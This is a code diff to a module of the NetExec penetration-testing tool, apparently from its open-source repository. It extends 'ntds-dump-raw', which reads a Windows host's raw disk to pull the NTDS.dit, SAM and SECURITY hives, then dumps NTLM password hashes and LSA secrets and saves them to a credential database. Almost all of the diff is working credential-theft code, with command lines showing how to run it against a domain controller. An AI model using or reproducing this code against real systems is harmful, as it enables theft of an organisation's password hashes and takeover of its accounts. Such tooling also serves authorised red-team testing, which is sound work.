@@ -10,24 +10,16 @@ from dataclasses import dataclass, field
 import random
 import gzip
 from io import BytesIO
-from impacket.examples.secretsdump import LocalOperations, NTDSHashes, SAMHashes
+from impacket.examples.secretsdump import LocalOperations, NTDSHashes, SAMHashes, LSASecrets
 from nxc.helpers.misc import validate_ntlm
 from nxc.helpers.powershell import get_ps_script
+import sys
 
 
 class NXCModule:
     name = "ntds-dump-raw"
     description = "Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive."
     supported_protocols = ["smb", "wmi", "winrm"]
-
-    files_full_location_to_extract = [
-        "Windows/System32/config/SYSTEM",
-        "Windows/System32/config/SAM",
-        "Windows/NTDS/ntds.dit",
-    ]
-    files_to_extract = [c_filename.split("/")[-1] for c_filename in files_full_location_to_extract]
-    number_of_file_to_extract = len(files_to_extract)
-    extracted_files_location_local = {"SAM": "", "SYSTEM": "", "ntds.dit": ""}
     NTFS_LOCATION = 0
     MFT_LOCATION = 0
     context = None
@@ -83,7 +75,36 @@ class NXCModule:
         full_path: str = ""
 
     def options(self, context, module_options):
-        """No options available"""
+        """TARGET: Specify the source from which the hashes will be extracted [NTDS, SAM, LSA] or any combination of them
+        Usage: nxc smb $IP -u Username -p Password -M ntds-dump-raw -o TARGET=SAM
+               nxc smb $IP -u Username -p Password -M ntds-dump-raw -o TARGET=NTDS,LSA,SAM
+        $IP can be a Domain Controller or a regular Windows machine.
+        """
+        available_options = {
+            "NTDS": "Windows/NTDS/ntds.dit",
+            "LSA": "Windows/System32/config/SECURITY",
+            "SAM": "Windows/System32/config/SAM"}
+        selected_files_full_path = []
+        if "TARGET" in module_options:
+            selected_options = module_options["TARGET"].split(",")
+            for option in selected_options:
+                if option in available_options:
+                    selected_files_full_path.append(available_options[option])
+                else:
+                    context.log.error(f"Uknown option format : {option}")
+                    sys.exit(1)
+        else:
+            selected_files_full_path.append(available_options["NTDS"])
+            selected_files_full_path.append(available_options["SAM"])
+        self.add_files_path_to_extract(selected_files_full_path)
+        
+    def add_files_path_to_extract(self, selected_files_full_path):
+        """Add the selected file paths for extraction and including SYSTEM by default"""
+        selected_files_full_path.append("Windows/System32/config/SYSTEM")
+        self.files_full_location_to_extract = selected_files_full_path
+        self.files_to_extract = [c_filename.split("/")[-1] for c_filename in self.files_full_location_to_extract]
+        self.number_of_file_to_extract = len(self.files_to_extract)
+        self.extracted_files_location_local = dict.fromkeys(self.files_to_extract, "")
 
     def read_from_disk(self, offset, size):
         """Get the raw content of the disk based on the specified offset and size by executing PowerShell code on the remote target"""
@@ -148,123 +169,134 @@ class NXCModule:
         self.read_MFT(MFT_file_header)
 
         if self.number_of_file_to_extract != 0:
-            self.logger.fail("Unable to find all needed files")
-            return
+            self.logger.fail("Unable to find all needed files, trying to work with what we have")
 
         self.logger.success("Heads up, hashes on the way...")
-        self.dump_ntds()
+        self.dump_hashes()
 
-    def dump_ntds(self):
+    def dump_hashes(self):
         """Dumping NTDS and SAM hashes locally from the extracted files"""
         # Mostly from nxc/modules/ntdsutil.py
         local_operations = LocalOperations(self.extracted_files_location_local["SYSTEM"])
         boot_key = local_operations.getBootKey()
         no_lm_hash = local_operations.checkNoLMHashPolicy()
+        
+        # NTDS hashes
+        if "ntds.dit" in self.extracted_files_location_local and self.extracted_files_location_local["ntds.dit"] != "":
+            def add_ntds_hash(ntds_hash, host_id):
+                """Extract NTDS hashes"""
+                add_ntds_hash.ntds_hashes += 1
+                ntds_hash = ntds_hash.split(" ")[0]
+                self.logger.highlight(ntds_hash)
+                if ntds_hash.find("$") == -1:
+                    if ntds_hash.find("\\") != -1:
+                        domain, clean_hash = ntds_hash.split("\\")
+                    else:
+                        domain = self.domain
+                        clean_hash = ntds_hash
+
+                    try:
+                        username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                        parsed_hash = f"{lmhash}:{nthash}"
+                        if validate_ntlm(parsed_hash):
+                            self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
+                            add_ntds_hash.added_to_db += 1
+                            return
+                        raise
+                    except Exception:
+                        self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+                else:
+                    self.logger.debug("Dumped hash is a computer account, not adding to db")
+
+            add_ntds_hash.ntds_hashes = 0
+            add_ntds_hash.added_to_db = 0
+
+            NTDS = NTDSHashes(
+                self.extracted_files_location_local["ntds.dit"],
+                boot_key,
+                isRemote=False,
+                history=False,
+                noLMHash=no_lm_hash,
+                remoteOps=None,
+                useVSSMethod=True,
+                justNTLM=True,
+                pwdLastSet=False,
+                resumeSession=None,
+                outputFileName=self.output_filename,
+                justUser=None,
+                printUserStatus=True,
+                perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, self.host),
+            )
+
+            try:
+                self.logger.success("NTDS hashes:")
+                NTDS.dump()
+            except Exception as e:
+                self.logger.fail(e)
+            
+            NTDS.finish()
 
         # SAM hashes
-        def add_SAM_hash(SAM_hash, host_id):
-            """Extract SAM hashes"""
-            add_SAM_hash.SAM_hashes += 1
-            SAM_hash = SAM_hash.split(" ")[0]
-            self.logger.highlight(SAM_hash)
-            if SAM_hash.find("$") == -1:
-                if SAM_hash.find("\\") != -1:
-                    domain, clean_hash = SAM_hash.split("\\")
+        if "SAM" in self.extracted_files_location_local and self.extracted_files_location_local["SAM"] != "":
+            def add_SAM_hash(SAM_hash, host_id):
+                """Extract SAM hashes"""
+                add_SAM_hash.SAM_hashes += 1
+                SAM_hash = SAM_hash.split(" ")[0]
+                self.logger.highlight(SAM_hash)
+                if SAM_hash.find("$") == -1:
+                    if SAM_hash.find("\\") != -1:
+                        domain, clean_hash = SAM_hash.split("\\")
+                    else:
+                        domain = self.domain
+                        clean_hash = SAM_hash
+                    try:
+                        username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                        parsed_hash = f"{lmhash}:{nthash}"
+                        if validate_ntlm(parsed_hash):
+                            self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
+                            add_SAM_hash.added_to_db += 1
+                            return
+                        raise
+                    except Exception:
+                        self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
                 else:
-                    domain = self.domain
-                    clean_hash = SAM_hash
+                    self.logger.debug("Dumped hash is a computer account, not adding to db")
 
-                try:
-                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
-                    parsed_hash = f"{lmhash}:{nthash}"
-                    if validate_ntlm(parsed_hash):
-                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
-                        add_SAM_hash.added_to_db += 1
-                        return
-                    raise
-                except Exception:
-                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
-            else:
-                self.logger.debug("Dumped hash is a computer account, not adding to db")
+            add_SAM_hash.SAM_hashes = 0
+            add_SAM_hash.added_to_db = 0
 
-        add_SAM_hash.SAM_hashes = 0
-        add_SAM_hash.added_to_db = 0
+            SAM = SAMHashes(
+                self.extracted_files_location_local["SAM"],
+                boot_key,
+                isRemote=False,
+                perSecretCallback=lambda secret: add_SAM_hash(secret, self.host),
+            )
+            try:
+                self.logger.success("SAM hashes:")
+                SAM.dump()
+                SAM.export(self.output_filename)
+            except Exception as e:
+                self.logger.debug(e)
+            SAM.finish()
 
-        SAM = SAMHashes(
-            self.extracted_files_location_local["SAM"],
-            boot_key,
-            isRemote=False,
-            perSecretCallback=lambda secret: add_SAM_hash(secret, self.host),
-        )
+        # LSA
+        if "SECURITY" in self.extracted_files_location_local and self.extracted_files_location_local["SECURITY"] != "":
+            LSA = LSASecrets(self.extracted_files_location_local["SECURITY"], boot_key, None, isRemote=False, perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret))
 
-        # NTDS
-        def add_ntds_hash(ntds_hash, host_id):
-            """Extract NTDS hashes"""
-            add_ntds_hash.ntds_hashes += 1
-            ntds_hash = ntds_hash.split(" ")[0]
-            self.logger.highlight(ntds_hash)
-            if ntds_hash.find("$") == -1:
-                if ntds_hash.find("\\") != -1:
-                    domain, clean_hash = ntds_hash.split("\\")
-                else:
-                    domain = self.domain
-                    clean_hash = ntds_hash
+            try:
+                self.logger.success("LSA Secrets:")
+                LSA.dumpCachedHashes()
+                LSA.dumpSecrets()
+            except Exception as e:
+                self.logger.fail(e)
 
-                try:
-                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
-                    parsed_hash = f"{lmhash}:{nthash}"
-                    if validate_ntlm(parsed_hash):
-                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
-                        add_ntds_hash.added_to_db += 1
-                        return
-                    raise
-                except Exception:
-                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
-            else:
-                self.logger.debug("Dumped hash is a computer account, not adding to db")
+        if "SAM" in self.extracted_files_location_local and self.extracted_files_location_local["SAM"] != "":
+            self.logger.success(f"Dumped {add_SAM_hash.SAM_hashes} SAM hashes to {self.output_filename}.sam of which {add_SAM_hash.added_to_db} were added to the database")
 
-        add_ntds_hash.ntds_hashes = 0
-        add_ntds_hash.added_to_db = 0
-
-        # NTDS hashes
-        NTDS = NTDSHashes(
-            self.extracted_files_location_local["ntds.dit"],
-            boot_key,
-            isRemote=False,
-            history=False,
-            noLMHash=no_lm_hash,
-            remoteOps=None,
-            useVSSMethod=True,
-            justNTLM=True,
-            pwdLastSet=False,
-            resumeSession=None,
-            outputFileName=self.output_filename,
-            justUser=None,
-            printUserStatus=True,
-            perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, self.host),
-        )
-
-        try:
-            self.logger.success("NTDS hashes:")
-            NTDS.dump()
-        except Exception as e:
-            self.logger.fail(e)
-
-        try:
-            self.logger.success("SAM hashes:")
-            SAM.dump()
-            SAM.export(self.output_filename)
-        except Exception as e:
-            self.logger.debug(e)
-
-        self.logger.success(f"Dumped {add_SAM_hash.SAM_hashes} SAM hashes to {self.output_filename}.sam of which {add_SAM_hash.added_to_db} were added to the database")
-        self.logger.success(f"Dumped {add_ntds_hash.ntds_hashes} NTDS hashes to {self.output_filename}.ntds of which {add_ntds_hash.added_to_db} were added to the database")
-
-        self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
-        self.logger.display(f"grep -iv disabled {self.output_filename}.ntds | cut -d ':' -f1")
-
-        SAM.finish()
-        NTDS.finish()
+        if "ntds.dit" in self.extracted_files_location_local and self.extracted_files_location_local["ntds.dit"] != "":
+            self.logger.success(f"Dumped {add_ntds_hash.ntds_hashes} NTDS hashes to {self.output_filename}.ntds of which {add_ntds_hash.added_to_db} were added to the database")
+            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
+            self.logger.display(f"grep -iv disabled {self.output_filename}.ntds | cut -d ':' -f1")
 
     def analyze_NTFS(self, ntfs_header):
         """Decode the NTFS headers and extract needed infromation from it"""
